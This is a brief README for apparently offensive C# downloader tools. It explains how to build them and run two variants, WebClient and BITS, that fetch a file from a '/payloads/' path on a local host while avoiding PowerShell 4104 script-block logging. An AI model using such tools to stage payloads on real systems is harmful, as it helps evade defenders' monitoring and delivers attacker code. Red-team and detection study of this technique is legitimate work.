# C# Downloader - No PowerShell 4104 Logging

## Build (one-time)

build.bat

## Option 1: WebClient (simple HTTP download)

Downloader.exe http://192.168.1.2:8080/payloads/golang/hello.exe hello.exe

## Option 2: BITS API (same mechanism as Start-BitsTransfer)

BitsDownloader.exe http://192.168.1.2:8080/payloads/golang/hello.exe hello.exe
